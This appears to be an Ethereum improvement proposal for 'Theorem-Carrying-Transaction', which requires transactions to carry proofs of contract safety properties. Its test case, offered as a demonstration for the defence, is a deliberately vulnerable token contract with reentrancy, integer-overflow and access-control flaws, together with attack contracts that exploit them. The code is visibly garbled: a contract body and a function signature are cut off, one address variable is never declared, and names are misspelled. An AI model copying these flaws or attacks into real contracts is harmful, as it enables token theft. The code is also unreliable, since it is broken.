### Abstract

Smart contracts are crucial elements of decentralized technologies, but they face significant obstacles to trustworthiness due to security bugs and trapdoors. To address the core issue, we propose a technology that enables programmers to focus on design-level properties rather than specific low-level attack patterns. Our proposed technology, called Theorem-Carrying-Transaction (TCT), combines the benefits of runtime checking and symbolic proof. Under the TCT protocol, every transaction must carry a theorem that proves its adherence to the safety properties in the invoked contracts, and the blockchain checks the proof before executing the transaction. The unique design of TCT ensures that the theorems are provable and checkable in an efficient manner. We believe that TCT holds a great promise for enabling provably secure smart contracts in the future.

### Motivation

This proposal is necessary since the Ethereum protocol does not ensure the safety features on the design level. It stems from the recognition of the significant obstacles faced by smart contracts in terms of trustworthiness due to security bugs and trapdoors. While smart contracts are crucial elements of decentralized technologies, their vulnerabilities pose a challenge to their widespread adoption. Conventional smart contract verification and auditing helps a lot, but it only tries to find as many vulnerabilities as possible in the development and testing phases. However, in real cases, we suffer from the unintentional vulnerabilities and logical trapdoors which lead to lack of transparency and trustworthiness of smart contract.

### Specification

First, we give several terminology:

- $\tau$: it denotes the theorem. Every transaction must carry a theorem that proves its adherence to the specified safety properties in the invoked contracts.
  
- $\mathrm{f}$: it denotes the entry function of transaction.
  
- $\varphi(\mathrm{V}, \mathrm{s})$: $\varphi$ denotes hypothesis which defined over input parameter $\mathrm{V}$ and blockchain state $\mathrm{s}$.
  
- $\mathrm{h}$: code path hash which is used for execution path match.
  
- Invariant: contract invariants like the ones are ensured before and after every transaction. They contain quantifiers, sum of map, etc., so are difficult to check concretely.
  
- behavioral subtyping: Unlike the conventional notion of OOP subtyping, which underpins today’s smart contracts and many other real-world systems, behavioral subtyping ensures that a derived class cannot violate properties defined in a base class.

For each transaction which is executed, it SHOULD satisfies the following theorem:

$$
\tau::=(\mathrm{f}, \varphi(\mathrm{V}, \mathrm{s}), \mathrm{h})
$$

The above theorem means​ for any transaction started by invoking $\mathrm{f}$ when $\varphi$ is satisfied, if it is completed (i.e., not reverted by EVM) and the hash of the code path equals $\mathrm{h}$, then all the assertions along the code path are guaranteed to hold. ​

### Rationale

Conventional approaches predominantly resort to specialized tools and the expertise of domain professionals to detect and address known vulnerabilities or bugs, targeting the prevention of unintended contract behaviors. While these methods have their merits, empirical evidence suggests a palpable shortfall in ensuring comprehensive safety features. In contrast, our application of TCT brings forth a robust security guarantee via runtime verification, markedly elevating the safety standards compared to the traditional strategies.  

While numerous projects delve into runtime verification, our approach is distinctly tailored to focus solely on transactions which has several merits:

- **Minimal runtime overhead**: By so doing, we anticipate a tangible reduction in the overhead typically associated with blanket verification mechanisms.

- **Concolic testing**: Further, by synthesizing the merits of runtime verification with symbolic proof, our methodology stands out in ensuring both the provability and verifiability of theorems, setting a benchmark in efficacy and reliability. 


### Backwards Compatibility

The primary concern lies in the potential for incompatibility, particularly with regards to the occurrence of a fork. The Theorem-Carrying-Transaction (TCT) system may reject certain transactions that violate the theorem, while the original Ethereum network may accept these transactions. This discrepancy in transaction acceptance could lead to a network fork, resulting in divergent block states. To address this issue, we propose conducting a comprehensive evaluation of TCT's effectiveness and stability by initially deploying it on a testnet such as `Goeril`.

### Test Cases

We extract a token contract from this [blog](https://blog.chain.link/reentrancy-attacks-and-the-dao-hack/) as shown below:

abstract contract Token {

abstract contract StandardToken is Token {

    function balanceOf(address _owner) public view override returns (uint256 balance) {
        return balances[_owner];
    }

    mapping (address => uint256) balances;
}

contract MultiVulnToken is StandardToken {
    string public name = "Demo token with reentrancy issue, integer overflow and access control issue";
    constructor (uint256 initialSupply) {
        totalSupply = initialSupply;
        balances[msg.sender] = totalSupply;
    }
    function transferProxy(address _from, address _to, uint256 _value, uint256 _fee

			balances[msg.sender] += _fee;
			balances[_from] -= _value + _fee;
			return true;
		}
    }

    //This function moves all tokens of msg.sender to the account of "_to"
    function clear(address _to) public {
        uint256 bal = balances[msg.sender];
        require (msg.sender!=_to);
        balances[_to]+=bal;
        bool success;
        (success, ) = msg.sender.call(
            abi.encodeWithSignature("receiveNotification(uint256)", bal)
        );
        require(success, "Failed to notify msg.sender");
        balances[msg.sender] = 0;
    }
}


contract reentrancy_attack {
    MultiVulnToken public multiVulnToken; 
    address _to;
    uint count=0;
    constructor (MultiVulnToken _multiVulnToken, address __to) 
    {
        multiVulnToken=_multiVulnToken;
        _to = __to;
    }
    function receiveNotification(uint256) public { 
        if (count < 9) {
            count ++;
            multiVulnToken.clear(_to); 
        }
    } 
    function attack() public {
        multiVulnToken.clear(_to);
    }
}

contract Demo {
    MultiVulnToken MultiVulnTokenContractAddress;

    address attacker1Address = address(0x92349Ef835BA7Ea6590C3947Db6A11EeE1a90cFd); //just an arbitrary address
    reentrancy_attack attacker2Address1;

    constructor () {
        MultiVulnTokenContractAddress = new MultiVulnToken(1000);
        attacker2Address1 = new reentrancy_attack(MultiVulnTokenContractAddress,attacker2Address2);

        //suppose attacker3Address1 has 5 tokens initially
        MultiVulnTokenContractAddress.transferProxy(address(this), address(attacker2Address1),5,0
                                      );
    }

    function getBalanceOfAttacker1() view public returns (uint256){
        return MultiVulnTokenContractAddress.balanceOf(attacker1Address);
    }
    function attack1_int_overflow() public {
        MultiVulnTokenContractAddress.transferProxy(address(this), 
                                      attacker1Address,
                                      uint256(2**255+1),
                                      uint256(2**255)
                                      );
    }

    function getBalanceOfAttacker2() view public returns (uint256){
        return MultiVulnTokenContractAddress.balanceOf(address(attacker2Address1))
            +  MultiVulnTokenContractAddress.balanceOf(attacker2Address2);
    }
    function attack2_reentrancy() public {
        attacker2Address1.attack();
    }
}
```

Note that we have provided the invariant for the entry functions above `abstract contract StandardToken`. Since TCT enables behavioral subtyping for smart contract, it still delivers its children contract such as `MultiVulnToken`.

For the contract `MultiVun`, we have provided a theorem for the entry function of transaction as below

```json
{
	"entry-for-test":"MultiVulnToken::clear(address)",
	"entry-for-real":"0x88c436e4a975ef5e5788f97e86d80fde29ddd13d::0x3d0a4061",
	"def-vars": {
		"totalSupply": ["", "this.totalSupply", "uint256"]
	},
	"hypothesis": [
		"totalSupply < TwoE256 && tx_origin != _to"
	],
	"path-hash-for-test": "*",
	"path-hash-for-real": "the real hash (not implemented yet)",
	"numerical-type": "int"
}
```

If attacker’s obligation to prove the theorem, the attempt would be doomed to fail.​

### Reference Implementation

We have build a MVP version of TCT mechanism in the [demo repo](https://github.com/TCT-web3/demo). What's more, We have integrated TCT mechanism into current Geth in the [TCT-Geth](https://github.com/TCT-web3/TCT-Geth).

### Security Considerations

In the current construct of our theorem repository, potential security vulnerabilities may exist. Given our intention to migrate the theorems to the InterPlanetary File System (IPFS), a compromised repository could precipitate a significant security breach.
